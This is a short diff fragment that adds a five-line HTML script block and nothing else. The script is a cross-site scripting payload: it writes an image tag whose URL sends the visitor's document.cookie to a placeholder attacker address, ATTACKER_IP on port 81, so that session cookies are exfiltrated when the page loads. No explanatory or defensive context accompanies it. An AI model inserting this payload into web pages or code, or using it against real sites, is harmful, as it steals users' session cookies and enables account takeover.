@@ -1,0 +1,5 @@
+<script>
+document.write('<img src=http://ATTACKER_IP:81/?cookie=');
+document.write(unescape(document.cookie));
+document.write('>');
+</script>
